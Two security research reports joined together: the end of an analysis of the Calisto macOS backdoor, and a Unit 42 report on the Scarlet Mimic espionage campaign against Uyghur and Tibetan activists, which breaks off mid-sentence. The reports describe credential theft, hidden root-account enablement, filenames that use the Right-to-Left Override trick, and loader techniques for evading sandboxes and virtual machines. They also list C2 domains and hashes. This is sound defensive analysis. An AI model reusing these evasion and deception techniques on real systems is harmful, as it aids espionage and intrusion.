starts, the application presents us with a sham license agreement. The text differs slightly from the Intego’s one — perhaps the cybercriminals took it from an earlier version of the product.\\nNext, the “antivirus” asks for the user’s login and password, which is completely normal when installing a program able to make changes to the system on macOS.\\nBut after receiving the credentials, the program hangs slightly before reporting that an error has occurred and advising the user to download a new installation package from the official site of the antivirus developer.\\nThe technique is simple, but effective. The official version of the program will likely be installed with no problems, and the error will soon be forgotten. Meanwhile, in the background, Calisto will be calmly getting on with its mission.\\nAnalysis of the Trojan\\nWith SIP enabled\\nCalisto’s activity on a computer with SIP (System Integrity Protection) enabled is rather limited. Announced by Apple back in 2015 alongside the release of OSX El Capitan, SIP is designed to protect critical system files from being modified — even by a user with root permissions. Calisto was developed in 2016 or earlier, and it seems that its creators simply didn’t take into account the then-new technology. However, many users still disable SIP for various reasons; we categorically advise against doing so.\\nCalisto’s activity can be investigated using its child processes log and decompiled code:\\nLog of commands executed by the Trojan during its operation\\nHardcoded commands inside the Calisto sample\\nWe can see that the Trojan uses a hidden directory named .calisto to store:\\nKeychain storage data\\nData extracted from the user login/password window\\nInformation about the network connection\\nData from Google Chrome: history, bookmarks, cookies\\nRecall that Keychain stores passwords/tokens saved by the user, including ones saved in Safari. The encryption key for the storage is the user’s password.\\nNext, if SIP is enabled, an error occurs when the Trojan attempts to modify system files. This violates the operational logic of the Trojan, causing it to stop.\\nError message\\nWith SIP disabled/not available\\nObserving Calisto with SIP disabled is far more interesting. To begin with, Calisto executes the steps from the previous chapter, but as the Trojan is not interrupted by SIP, it then:\\nCopies itself to /System/Library/ folder\\nSets itself to launch automatically on startup\\nUnmounts and uninstalls its DMG image\\nAdds itself to Accessibility\\nHarvests additional information about the system\\nEnables remote access to the system\\nForwards the harvested data to a C&C server\\nLet’s take a closer look at the malware’s implementation mechanisms.\\nAdding itself to startup is a classic technique for macOS, and is done by creating a .plist file in the /Library/LaunchAgents/ folder with a link to the malware:\\nThe DMG image is unmounted and uninstalled via the following command:\\nTo extend its capabilities, Calisto adds itself to Accessibility by directly modifying the TCC.db file, which is bad practice and an indicator of malicious activity for the antivirus. On the other hand, this method does not require user interaction.\\nAn important feature of Calisto is getting remote access to the user system. To provide this, it:\\nEnables remote login\\nEnables screen sharing\\nConfigures remote login permissions for the user\\nAllows remote login to all\\nEnables a hidden “root” account in macOS and sets the password specified in the Trojan code\\nThe commands used for this are:\\nNote that although the user “root” exists in macOS, it is disabled by default. Interestingly, after a reboot, Calisto again requests user data, but this time waits for the input of the actual root password, which it previously changed itself (root: aGNOStIC7890!!!). This is one indication of the Trojan’s rawness.\\nAt the end, Calisto attempts to transfer all data from the .calisto folder to the cybercriminals’ server. But at the time of our research, the server was no longer responding to requests and seemed to be disabled:\\nAttempt to contact the C&C server\\nExtra functions\\nStatic analysis of Calisto revealed unfinished and unused additional functionality:\\nLoading/unloading of kernel extensions for handling USB devices\\nData theft from user directories\\nSelf-destruction together with the OS\\nLoading/unloading of kernel extensions\\nWorking with user directories\\nSelf-destruction together with the entire system\\nConnections with Backdoor.OSX.Proton\\nConceptually, the Calisto backdoor resembles a member of the Backdoor.OSX.Proton family:\\nThe distribution method is similar: it masquerades as a well-known antivirus (a Backdoor.OSX.Proton was previously distributed under the guise of a Symantec antivirus product)\\nThe Trojan sample contains the line “com.proton.calisto.plist”\\nLike Backdoor.OSX.Proton, this Trojan is able to steal a great amount of personal data from the user system, including the contents of Keychain\\nRecall that all known members of the Proton malware family were distributed and discovered in 2017. The Calisto Trojan we detected was created no later than 2016. Assuming that this Trojan was written by the same authors, it could well be one of the very first versions of Backdoor.OSX.Proton or even a prototype. The latter hypothesis is supported by the large number of unused and not fully implemented functions. However, they were missing from later versions of Proton.\\nTo protect against Calisto, Proton, and their analogues:\\nAlways update to the current version of the OS\\nNever disable SIP\\nRun only signed software downloaded from trusted sources, such as the App Store\\nUse antivirus software\\nMD5\\nDMG image: d7ac1b8113c94567be4a26d214964119\\nMach-O executable: 2f38b201f6b368d587323a1bec516e5d\\nApple MacOS Backdoor Malware Descriptions\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nRoaming Mantis, part V\\nKBOT: sometimes they come back\\nSmartphone shopaholic\\nLeave a Reply Cancel Reply\\nYour email address will not be published.

      "\"Scarlet Mimic: Years-Long Espionage Campaign Targets Minority Activists\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nScarlet Mimic: Years-Long Espionage Campaign Targets Minority Activists\\n27,612\\npeople reacted\\n0\\n27\\nmin. read\\nShare\\nBy Robert Falcone and Jen Miller-Osborn\\nJanuary 24, 2016 at 5:00 PM\\nCategory: Reports, Threat Prevention, Unit 42\\nTags: Android, Apple, AutoFocus, BrutishCommand, CallMe, cyber espionage, Cyber Threat Alliance, cybersecurity, Espionage, FakeM, Mac OS X, microsoft, MobileOrder, Psylo, Scarlet Mimic, SkiBoot Loader, SubtractThis, Trojans, WildFire\\nExecutive Summary\\nOver the past seven months, Unit 42 has been investigating a series of attacks we attribute to a group we have code named “Scarlet Mimic.” The attacks began over four years ago and their targeting pattern suggests that this adversary’s primary mission is to gather information about minority rights activists. We do not have evidence directly linking these attacks to a government source, but the information derived from these activities supports an assessment that a group or groups with motivations similar to the stated position of the Chinese government in relation to these targets is involved.\\nThe goal of this report is to expose the tools, tactics and infrastructure deployed by Scarlet Mimic in order to increase awareness of this threat and decrease its operational success through deployment of prevention and detection countermeasures. From our vantage point, we are not able to identify which attacks have been successful against which organizations.\\xa0But\\xa0the fact that the tools Scarlet Mimic deploys have been under development for years\\xa0suggests\\xa0an active adversary\\xa0that has been successful in some percentage\\xa0of\\xa0its\\xa0operations.\\xa0Based on our analysis, we are also seeing Scarlet Mimic start to expand\\xa0its\\xa0espionage efforts from PCs to mobile devices, marking an evolution in\\xa0its\\xa0tactics.\\nIndividuals and groups of all different types may become the target of cyber espionage campaigns. The most well known victims of cyber espionage are typically government organizations or high-tech companies, but it’s important to recognize that espionage-focused adversaries are tasked to collect information from many sources.\\nThe attacks we attribute to Scarlet Mimic have primarily targeted Uyghur and Tibetan activists as well as those who are interested in their causes. Both the Tibetan community and the Uyghurs, a Turkic Muslim minority residing primarily in northwest China,\\xa0have been targets of multiple sophisticated attacks in the past decade. Both also have history of strained relationships with the government of the People’s Republic of China (PRC), though we do not have evidence that links Scarlet Mimic attacks to the PRC.\\nScarlet Mimic attacks have also been identified\\xa0against government organizations in Russia and India, who are responsible for tracking activist and terrorist activities. While we do not know the precise target of each of the Scarlet Mimic attacks, many of them align to the patterns described above.\\nThe Scarlet Mimic attacks primarily center around the use of a Windows backdoor named “FakeM.” It was first described by Trend Micro in 2013 and was named FakeM because its primary command and control traffic mimicked Windows Messenger and Yahoo! Messenger network traffic to evade detection. We have identified two subsequent variants of the FakeM family, which has undergone significant changes since it was exposed in 2013. We have also identified nine distinct “loader” malware families, which Scarlet Mimic appears to use to avoid detection when infecting a system.\\nIn addition to the FakeM variants, Scarlet Mimic has deployed Trojans that target the Mac OS X and Android operating systems. We have linked these attacks to Scarlet Mimic through analysis of their command and control (C2) infrastructure.\\nTo infect individuals with access to the data the actors desire, Scarlet Mimic deploys both spear-phishing and watering hole (strategic web compromise) attacks. Using these tactics they can directly target previously identified individuals (spear phishing) as well as unidentified individuals who are interested in a specific subject (watering hole). In their spear phishing attacks, Scarlet Mimic has exploited five separate vulnerabilities. However, in many cases they chose to forgo exploiting a software vulnerability and used self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension, tricking victims into opening executable files.\\nAs with many other attackers who use spear-phishing to infect victims, Scarlet Mimic makes heavy use of “decoy” files. These are legitimate documents that contain content relevant to the subject of the spear phishing e-mail. After the system is infected, the malware displays the decoy document to trick the user into believing nothing harmful has occurred. These decoy documents allow us to identify the theme of the spear phishing e-mail and in some cases the target of the attack.\\nThe most recent Scarlet Mimic attacks we have identified were conducted in 2015 and suggest the group has a significant interest in both Muslim activists and those interested in critiques of the Russian government and Russian President Vladimir Putin. Based on their previous targets we suspect these individuals may be targeted based on the information they posses on activist groups.\\nThe primary source of data used in this analysis is Palo Alto Networks WildFire, which analyzes malware used in attacks across the world. The system also analyzes malware samples collected through a sharing partnership with other security vendors, including our partners in the Cyber Threat Alliance. To connect attacks to each other based on malware behavior and command and control infrastructure, we relied on AutoFocus threat intelligence. AutoFocus users can view all of the files related to Scarlet Mimic and the malware associated with the group using the following links:\\nScarletMimic\\nFakeM\\nPsylo\\nMobileOrder\\nIntroduction\\nThe better we can understand the threats to our networks and systems, the more effective we will be at preventing those threats. The goal of this report is to help network defenders better understand attacks from a group we have named Scarlet Mimic. This group has been conducting attacks for at least four years using a backdoor Trojan that has been under active development. The group primarily deploys spear-phishing e-mails to infect its targets, but was also responsible for a watering hole (strategic web compromise) attack in 2013.\\nAttacks from this group have been reported publicly in the past, but mostly as disparate, unconnected incidents. Based on analysis of the data and malware samples we have collected, Unit 42 believes the attacks described herein are the work of a group or set of cooperating groups who have a single mission, collecting information on minority groups who reside in and around northwestern China. In the past, Scarlet Mimic has primarily targeted individuals who belong to these minority groups as well as their supporters, but we’ve recently found evidence to indicate the group also targets individuals working inside government anti-terrorist organizations. We suspect these targets are selected based on their access to information about the targeted minority groups.\\nIn the following sections we will describe selected attacks we have identified and who their likely targets are. We will also provide detailed analysis of the latest variants of the malware they deploy (known as FakeM) as well as other associated tools that allow Scarlet Mimic to target Android and OS X devices.\\nAttacks launched by this group were publicly exposed on 2013 in a Trend Micro report about the FakeM Trojan. Since that reports release, Scarlet Mimic has deployed two additional versions of the malware. They have also deployed nine separate “loader” Trojans they use to infect systems with their backdoor.\\nAttack Details\\nThe majority of attacks we associate with Scarlet Mimic follow the pattern shown in Figure 1.\\nFigure 1: “Spear Phishing with Decoy” Attack Pattern Deployed by Scarlet Mimic\\nThe attacker sends a spear-phishing e-mail with a subject and body content that appeal to the targeted user. This e-mail carries an attachment, which is typically a document that exploits a Microsoft Office vulnerability. The attachment uses a file name that is related to the e-mail content to trick the user into opening it. If the user opens the file and the exploitation is successful, a backdoor Trojan is installed on the system that gives the attacker access and a decoy document is displayed to the victim. Decoy documents are typically non-malicious versions of the content the user expected to see when opening the attachment.\\nMany of the targets and spoofed or compromised sending e-mail addresses have contact information on the Internet. The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations. A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic.\\nMany attackers deploy this particular pattern, as it is often successful at infecting a user without alerting the user of the infection. This is the exact same pattern, for example, deployed by the attackers in Operation Lotus Blossom.\\nWe have identified spear phishing documents from Scarlet Mimic exploiting the following vulnerabilities.\\nCVE-2012-0158\\nCVE-2010-3333\\nCVE-2010-2883\\nCVE-2010-2572\\nCVE-2009-3129\\nWe also know Scarlet Mimic uses a number of toolkits to create documents that contain exploit code to install the FakeM payload on a compromised system. Unit 42 tracks the toolkits delivering FakeM under the names MNKit, WingD and Tran Duy Linh. These kits appear to be used by many attack groups, and they alone are not a good indication of Scarlet Mimic activity.\\nAdditionally, in many cases these threat actors did not use an exploit document at all, rather they sent self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension. For example, the following two filenames of SFX archives used to deliver FakeM contain the RLO character (bolded):\\nUpdate about the status of Tenzin Delek Rinpoche’ashes%E2%80%AEcod.scr\\ntepsiliy mezmun.\\\\xe2\\\\x80\\\\xaetxt.scr\\nEven when no software vulnerability is exploited, the attacks still typically include a decoy document. The content of most of the decoy documents appear to be available on the open Internet, and the attackers typically made small modifications to them.\\nMany of the targets and spoofed or compromised sending accounts have contact information on the Internet. The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations. A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic. The overarching decoy themes were Uyghur-related, anti-Putin, or Al-Qaeda-related. The decoys are often copied from think tanks or reputable news sources the targets would likely frequent.\\nIn one instance, the threat actors used content from a New York Times article (Figure 2) on the same day it was published.\\nFigure 2: Decoy Text Extracted from the New York Times article\\nFigure 3 shows one of the more common themes used to target Uyghurs and those interested in their cause. Multiple attacks used press releases or other content related to the World Uyghur Congress.\\nFigure 3: Decoy using World Uyghur Congress Press Release\\nIn July of 2015, we identified a full e-mail uploaded to an antivirus scanning service that carried a Scarlet Mimic exploit document. In this case (Figure 4) the recipient of the e-mail was an individual working for the Russian Federal Security Service (fsb.ru). The e-mail body requests help dealing with threatening phone calls from an international gang.\\nFigure 4: Phishing E-mail send to FSB E-mail Address\\nAnother attack, sent to an unknown target carried a decoy image (Figure 5) that compared Russian President Vladimir Putin to Adolf Hitler.\\nFigure 5: Anti-Putin image used as a decoy document\\nIn yet another case, the threat actors used a conference notification from one organization (Figure 6a) and modified it to appear as thought it was for an “Islamic Country Muslim Religion Conference” (Figure 6b). This document was particularly poorly altered, as the registration form still contained multiple hints to indicate the document was fraudulent (Figure 6c).\\nFigure 6a: Original document used as a Psylo decoy\\nFigure 6b: Modified header and contact email in the decoy\\nFigure 6c: Bottom of the decoy document with replaced email and non-altered date — a\\xa0quick search online shows this to be fraudulent\\nIn total we have collected over 40 individual decoy documents used in these attacks, far more than we can detail here.\\nWe are aware of one case where Scarlet Mimic broke from the spear-phishing pattern described above. In 2013, the group deployed a watering hole attack, also known as a strategic web compromise to infect victims with their backdoor. The watering hole is an attack vector that involves compromising a website that targeted victims are likely to visit in order to infect and gain access to their systems. According to a blog by Websense, threat actors compromised the Tibetan Alliance of Chicago’s website to host malicious code that exploited a vulnerability in Internet Explorer (CVE-2012-4969.) Microsoft patched this vulnerability in September 2012, suggesting that this watering hole attack used an older vulnerability, which aligns with the threat groups continued use of older vulnerabilities in their spear-phishing efforts.\\nMalware Overview\\nFirst discussed in January 2013 in a Trend Micro whitepaper, FakeM is a Trojan that uses separate modules to perform its functionality. FakeM’s functional code is shellcode-based and requires another Trojan to load it into memory and execute it. There are a variety of different Trojans used to load FakeM, some of which are more interesting than others. In this section, we will explore the loader Trojans followed by an analysis of the evolution of FakeM itself. We end this section with a discussion on tools related to FakeM and used by Scarlet Mimic.\\nLoader Trojans\\nFakeM is shellcode-based and therefore requires another Trojan to load FakeM into memory and execute its functional code. Threat actors have developed many different loading Trojans to load FakeM, some of which are fairly straightforward while others use very clever techniques to avoid detection. Unit 42 tracks the following list of loader Trojans that Scarlet Mimic has used to execute FakeM:\\nCrypticConvo\\nSkiBoot\\nRaidBase\\nFakeHighFive\\nPiggyBack\\nFullThrottle\\nFakeFish\\nBrutishCommand\\nSubtractThis\\nIt appears that the threat actors include the loader Trojans in some sort of builder application that allows actors to quickly create, configure and deploy payloads to execute FakeM. We believe this because many samples that execute FakeM have the same exact compilation time but different C2 servers, as seen in the example in Table 1. This suggests the actors compile a single sample and use a builder tool to configure individual samples on demand.\\nWe used the loader Trojans to provide a general timeline for the development of FakeM samples, as FakeM is shellcode-based and does not contain any usable timestamps. The timestamps in the loader Trojans does not necessarily correspond to the usage of FakeM, but plotting the compile times of the loaders on a timeline shows an interesting trend. The scatter plot timeline in Figure 7 shows the known compilation times of the loader Trojans and the FakeM variant that it executed.\\nSHA256\\nCompiled\\nLoader Trojan\\nC2 Domains\\n5182dc8667432d76a\\n276dc4f864cdfcef3e4\\n81783ebaf46d3b139\\n7080b798f4a\\n2013-09-13 08:02:58\\nCrypticConvo\\nopero.spdns.org, firefox.spdns.de\\n5dade00db195087aa\\n336ce190b5fd1c2299\\n2c49556c623b42a9f7\\n42d73241a7f\\n2013-09-13 08:02:58\\nCrypticConvo\\nintersecurity.firewall-gateway.com\\nTable 1: Two samples sharing a compile time yet contain different C2 domains in their configurations\\nFigure 7: Timeline of compilation of loader Trojans associated with FakeM\\nBased on the timeline, it appears that the actors were actively developing several of the loaders at the same time from 2009 until the early months of 2014. After the first quarter of 2014, it appears that the actors abandoned development of the older loaders in favor of FakeFish, BrutishCommand and SubtractThis. This does not mean that actors will not continue to use the older loaders, but it does suggest that the actors will continue including the newer or freshly developed loaders in updated builder applications.\\nThe timeline also presents the possibility that the FakeM developers reacted to the release of Trend Micro’s FakeM blog and whitepaper. Trend Micro published their analysis of the FakeM Trojan on January 17, 2013 (marked in Figure 7 by a red line) that discussed the original variant of FakeM. Shortly after, the original variant of FakeM drops off the timeline in favor of the SSL and Custom SSL variants. It is possible that the FakeM developers saw their tool was exposed and adapted it to avoid detection for continued use as a payload in attacks. We cannot be certain if the developers reacted specifically to Trend Micro’s content, as it is possible that they were reacting to the increased antivirus detection rate of their tool that resulted from the exposure of the tool. Regardless of the specific stimulus, the reaction shows that the FakeM threat actors evolved to avoid detection/attribution and to continue their attack campaigns.\\nThe timeline does have one noticeable outlier, specifically the FakeHighFive sample compiled in September 2009 that loaded a FakeM SSL sample. We believe this compile time is incorrect, as the C2 domain for this sample, specifically press.ufoneconference.com, was registered by the threat actor in February 2013. The registration of the C2 domain in February 2013 aligns with other compilation times of FakeM SSL, which leads us to the conclusion that the September 2009 compilation timestamp was modified and/or inaccurate.\\nMost of the related loader Trojans, such as CrypticConvo, PiggyBack, FullThrottle, FakeHighFive, FakeFish and RaidBase do little more than load encrypted FakeM shellcode (either from a PE resource or embedded data), decrypt it, and execute the resulting shellcode. Other related loading Trojans, such as SubtractThis, BrutishCommand and SkiBoot employ clever techniques worth discussing.\\nSubtractThis\\nThe SubtractThis loader displays a technique that is quite clever. This loader received its name based on a technique it uses to delay before carrying out its main functionality, specifically by requiring the user to hit the minus (“-“) key. SubtractThis carries out this technique through the following steps:\\nCalls LoadAcceleratorsA function to load the virtual key for the minus character “-“. Example: LoadAcceleratorsA(hInstance, VK_SUBTRACT);\\nCalls SetTimer function to set up a callback function that will be called in the event that the LB_FINDSTRING Windows message. Example: SetTimer(0, LB_FINDSTRING_, 10000u, TimerFunc);\\nCreates a continuous loop that starts by calling GetMessageA to obtain Windows messages\\nCalls TranslateAcceleratorA to check Windows message received is VK_SUBTRACT “-“.\\nCalls the callback function set up in the SetTimer function if the user enters the minus “-“ key.\\nThis technique requires user interaction, which makes analysis in sandboxes more difficult.\\nBrutishCommand\\nThe BrutishCommand loader uses a very interesting method to decrypt the FakeM functional code. The main function in this loader checks the command line arguments passed to it, and if there are none present it will obtain a random number between 0-9 and create a new process using the same executable with this random number as a command line argument.\\nIf the executable has a command line argument, the Trojan subjects the value to a hashing algorithm and compares the hash to 0x20E3EEBA. If the value matches the static hash, the executable will subject the command line argument to a second algorithm that will produce a value that the Trojan will use as the decryption key to decrypt the embedded FakeM shellcode. It essentially brute forces its own decryption key by rerunning itself over and over until it runs with the correct value is provided on the command line. Unit 42 had not seen this technique used by other malware families and it introduces a challenging hurdle when attempting to analyze or debug the loader Trojan.\\nSkiBoot Loader\\nSkiBoot reads the master boot record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode. It carries out this functionality by calling the ReadFile function to read 512-bytes from “\\\\\\\\.\\\\PHYSICALDRIVE0” and specifically uses the last byte of the MBR as the encryption key. The last byte of the MBR is “\\\\xAA”, or the second byte of “\\\\x55\\\\xAA”, which is the boot signature portion of the MBR.\\nInstead of using ReadFile, one variant of this loader reads the MBR using DeviceIOControl using the ID_CMD control code, and accesses a specific offset to obtain the value that it will rotate each byte in the ciphertext within the decryption algorithm. The significance of using DeviceIOControl is that the VMware hypervisor responds to this API call with a blank buffer instead of the MBR, whereas the Virtualbox hypervisor returns the MBR correctly. It appears that this loader is specifically using the DeviceIOControl API function as a VMware detection technique, suggesting that the developers are well versed in the nuances of the VMware hypervisor and virtual machine evasion.\\nEvolving FakeM: Variants\\nSince being originally exposed in 2013, authors of FakeM have continuously made changes to the FakeM codebase, resulting in multiple variants. Before elaborating on the different variants of FakeM, there are many similarities that remain throughout the various iterations. The architecture has not changed during the evolution of FakeM, as a modular framework exists in each variant, as seen in Figure 8. The FakeM main module is responsible for launching embedded modules, such as a keylogger or for gathering sensitive files. The main module is also responsible for communicating with its C2 servers and handling commands issued by the C2 server.\\nFigure 8: FakeM Architecture\\nAll FakeM variants initiate communications with its C2 server and check the C2’s response for a command. Also, all FakeM variants share a common command handler with the same capabilities, as seen in Table 2. The limited command set suggests that FakeM’s functionality is obtained by additional assembly code provided by the C2 server with the 0x211 command. According to Trend Micro’s initial analysis on FakeM, threat actors delivered and ran additional code that provided further capabilities to the Trojan, such as the ability to run shell commands, steal passwords, capture the screen and upload files.\\nCommand\\nDescription\\n0x211\\nRun assembly code directly from the C2.\\n0x212\\nIdle. Attempts to receive another command immediately instead of sleeping for 30 seconds.\\n0x213\\nSets a flag to end the session with the C2. This will force the Trojan to reestablish a session with the C2.\\n0x214\\nExit process.\\nTable 2: Command handler within all variants of FakeM\\nNow that we have covered the commonalities between FakeM variants, the following sections will dive into the specific variants of FakeM. Unit 42 categorizes the different variations of FakeM based on the method used to communicate with the C2 server, which has changed dramatically over the years.\\nOriginal FakeM\\nThe original variant of FakeM generates network beacons to its C2 server that begin with a 32-byte header that in most cases is meant to blend into network traffic generated by legitimate applications. Following this 32-byte header, the original variant of FakeM includes data encrypted using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation.\\nThe original variant includes the FakeM discovered and published by Trend Micro in 2013, in which the authors of FakeM first attempted to evade detection of its C2 communications by pretending to be generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Figures 9 and 10 show FakeM attempting to resemble MSN or Yahoo! Messenger traffic, as the first 32-bytes contain data that resemble legitimate traffic generated by these chat programs.\\nFigure 9: FakeM using fake MSN messenger traffic for C2 communication\\nFigure 10: FakeM using fake Yahoo! Messenger for C2 communication\\nIn addition to emulating chat programs, FakeM has also included HTML code within the 32-byte header. As you can see in Figure 11, the overall structure of the beacon did not change, rather the only differences is the data in the header contains HTML tags. The HTML data in the header led Unit 42 to a whitepaper published by Malware.lu that suggested the MSN, Yahoo, and HTML versions of the original variant of FakeM all share a common server application that the threat actors use to build samples and control infected systems.\\nFigure 11: FakeM HTML tags in C2 header\\nIn October 2013, FireEye published a blog about a sample of FakeM that did not use fake messenger or HTML data in the first 32 bytes of the C2 traffic, but instead used four repeating bytes to fill this portion of the packet, as seen in Figure 12. Unit 42 tracks this under the original variant, as it uses the same algorithm to encrypt the data and otherwise shares a common structure to the MSN, Yahoo, and HTML versions with the exception of the modification to the first 32 bytes.\\nFigure 12: FakeM C2 beacon with four repeating bytes\\nFakeM SSL\\nWhile performing infrastructure analysis on FakeM original variants, we came across shared infrastructure with domains that hosted C2 servers for malware samples that did not match the known FakeM communication protocols. Palo Alto Networks WildFire had analyzed many samples associated with these related C2 domains, all of which communicated with the C2 server using secure sockets layer (SSL). To determine the malware family that was generating this traffic, Unit 42 analyzed these samples and found that the functional code was the same as the original FakeM variant.\\nThis discovery indicates the authors of FakeM introduced new code to the Trojan in order to use SSL to communicate with its C2 server. The drastic change in C2 channel warranted a new variant name, and we dubbed it “FakeM SSL”. During the analysis of these samples we did not find any operational C2 servers to complete a handshake to establish a SSL session. During the handshake, the FakeM SSL samples will tell the server it supports 36 different cipher suites even though the samples appear to only support one. Unit 42 believes the cipher suite within the FakeM SSL variants uses Diffie-Hellman for key exchange and the RC4 cipher to encrypt the C2 communications.\\nFakeM Custom SSL\\nIn July 2015, Scarlet Mimic delivered a spear-phishing email to a branch of the Russian government with intentions of installing a payload that was undetected by any antivirus vendors on VirusTotal. The high profile target and the lack of antivirus detection prompted Unit 42 to perform an in-depth analysis and found that it is yet another new variant of the FakeM Trojan. We also named this variant after it’s communication protocol (FakeM Custom SSL.)\\nThis new variant of FakeM shared the same functional code as its predecessors, but again the communications with the C2 dramatically differed from the other variants. Communications between this variant and the C2 server leverage what Unit 42 believes is modified SSL code, as the code is very similar to the FakeM SSL variant. The code appears to use Diffie-Hellman for key exchange and the RC4 algorithm like FakeM SSL; however, the initial packet sent to the C2 server did not contain a “client hello” message, which is required to initiate an SSL handshake. Instead, the initial packet sent data as seen in Figure 13.\\nFigure 13: Hexdump of FakeM custom SSL variant\\nThis variant of FakeM skips the traditional SSL handshake, which involves an agreement on a cipher suite to use to encrypt communications. The FakeM code only supports one cipher suite, which makes the cipher suite agreement portion of the SSL handshake irrelevant. Instead, FakeM creates a session with its C2 server by exchanging keys. The lack of a valid handshake makes detection of this C2 stream difficult, as the packets sent between the Trojan and the C2 to establish this session contain random binary data. Network devices will also be unable to perform any SSL decryption due to the lack of detection and the inability to determine the cipher suite used to encrypt the data. Figure 14 below provides a visual depiction of the handshake procedure and the subsequent beacon and command messages.\\nFigure 14: Communications between system and C2 server, including the key exchange\\nThe handshake starts with a key exchange, which the Trojan initiates by creating a 2048-byte buffer that it will store its key (128-bytes, followed by null values as seen in Figure 13) and sending its key to the C2 server. The C2 will respond with its own key (also 128-bytes, followed by null values) that the Trojan will store and use to encrypt future communications.\\nOnce this key exchange is complete, the Trojan acknowledges the receipt of the server’s key by sending another 2048-byte packet to the server. To build the acknowledgement packet, the Trojan creates a 2048-byte buffer filled with null values and copies the string “ws32.dll” to offset 8 and encrypts the buffer with the server’s key.\\nAfter sending the acknowledgement packet, the Trojan will gather local system information and include it in a beacon to the C2 server. Like the packets sent in the key exchange, the beacon sent by the Trojan to the C2 server is 2048-bytes in length; however, the system information gathered by the Trojan is only 296 bytes followed by 1752 are null values to fill the 2048 byte buffer. The system information follows the 296-byte structure seen below:\\nstruct beaconToC2 {\\nDWORD static_value_130h;\\nCHAR username128;\\nCHAR computername128;\\nDWORD static_value_70000h;\\nDWORD os_codepage;\\nDWORD campaign_code_1;\\nDWORD campaign_code_2;\\n};\\n123456789\\nstruct beaconToC2 { DWORD static_value_130h; CHAR username128; CHAR computername128; DWORD static_value_70000h; DWORD os_codepage; DWORD campaign_code_1; DWORD campaign_code_2;};\\nThe Trojan will encrypt this data using the key provided by the C2 and send it to the server. The Trojan will then wait for the C2 to respond, which it will decrypt and parse for FakeM commands. Unit 42 has been unable extract any plug-ins from C2 network traffic; however, several FakeM custom SSL samples contain embedded plug-ins that run without interaction with the C2 server. Also, Unit 42 was able to extract several modules from the original FakeM server application, as seen in Table 3. All of these modules are shellcode-based plug-ins that would work with the custom SSL variant of FakeM with little to no modification.\\nMD5\\nSize (bytes)\\nDescription\\n7a1410b2eceb99ec268b50e9371e74c1\\n3724\\nProcess Plug-ins\\n092085e76512f071cab12f76ed09b348\\n2412\\nShell Plug-ins\\n8f4cbb78356cb672bf2566e44315eb96\\n1768\\nFile Plug-ins\\n16ab40f84fc47bab2c7874bb3164c5b4\\n2268\\nScreen Plug-ins\\n30337e99631a174d822dd3ea00a5f6cf\\n2204\\nRegedit Plug-ins\\n1f3fbb789bcbe9186a50c4f4db269736\\n1996\\nService Plug-ins\\n4313d9d5fc6a090e2abc41633cb2c1fd\\n3196\\nHostInfo Plug-ins\\nfe75dff8b86dd8989d2ca00df19d51be\\n2220\\nKeyBoard Plug-ins\\n3e184a7af74905f3d3acbec913252f72\\n1884\\nShell Plug-ins\\nb59e8751b9f61bd4f4b9b62de8242751\\n3896\\nOE Pwd Plug-ins\\n83ec457cba27e470404c942eb9242eeb\\n2156\\nU-Files Plug-ins\\nTable 3: Modules extracted from the original FakeM variant’s server application\\nRelated to FakeM Original: CallMe\\nCallMe is a Trojan designed to run on the Apple OSX operating system. This Trojan was delivered in targeted attacks on Uyghur activists in 2013 and used infrastructure associated with FakeM.\\nIn February 2013, AlienVault performed analysis on the CallMe Trojan and found that it is based on a tool called Tiny SHell, an OSX shell tool whose source code is available on the Internet. The Trojan uses AES to encrypt the communication channel its C2 server, which will provide one of three commands to carry out activities on the compromised system, as seen in Table 4.\\nCommand\\nDescription\\n1\\nGet a file from the system and upload it to the C2 server.\\n2\\nPut a file on the system from the C2 server. File is saved to a specified filename in <HOME directory>/downloads/.\\n3\\nCreate a reverse shell to interact with the compromised system.\\nTable 4: Commands Available in the CallMe OSX Malware\\nThe infrastructure overlap between FakeM and CallMe involves the fully qualified domain name (FDQN) of “googmail.org”, which was used by both FakeM and CallMe samples. This suggests that not only do these threat actors have the ability to compromise victims running the Microsoft Windows operating system, but they can also target individuals running Apple’s OSX as well.\\nRelated to FakeM Custom SSL: Psylo\\nDuring infrastructure analysis of FakeM Custom SSL variants, Unit 42 found infrastructure overlaps between FakeM and another new, previously unreported Trojan that we named “Psylo”. Psylo is a tool that allows threat actors to upload and download files to and from a compromised system, as well as execute commands and applications on the system. The name Psylo is an anagram from the mutex created when initially running this payload, which is ‘hnxlopsyxt’.\\nPsylo is similar to FakeM in that they are both shellcode-based, and they have similar configurations and C2 communication channels. As you can see from the following two configuration structures, Psylo and FakeM have similar configurations with only the array length of the C2 locations being different.\\nstruct psylo_c2_config {char60 c2_host_1;char60 c2_host_2;char60 c2_host_3;DWORD c2_port_1;DWORD c2_port_2;DWORD c2_port_3;};\\nstruct fakem_customssl_c2_config {char64 c2_host_1;char64 c2_host_2;char64 c2_host_3;DWORD c2_port_1;DWORD c2_port_2;DWORD c2_port_3;};\\nFigure 15: Comparison between Psylo and FakeM custom SSL configurations\\nBoth use SSL to communicate with their C2 servers, and it appears they share common code to carry out the Diffie Hellman key exchange. We compared the Diffie Hellman code from Psylo with FakeM custom SSL variant and found that they were very similar, but the FakeM samples had some of the functionality within sub-functions, which rendered binary diffing between the two Trojans impossible.\\nAnother slight difference involves how Psylo and FakeM generate random numbers for SSL. FakeM uses QueryPerformanceCounter to create a random number, whereas Psylo uses CryptGenRandom, both of which generate random numbers 68 bytes long. Interesting enough is that CryptGenRandom calls RtlGenRandom, which uses QueryPerformanceCounter along with other system attributes to generate a random number.\\nWhen communicating with its C2 server, Psylo will use HTTPS with a unique user-agent of (notice the lack of a space between “5.0” and “(Windows”):\\nMozilla/5.0(Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0\\nUnit 42 does not consider Psylo another variant 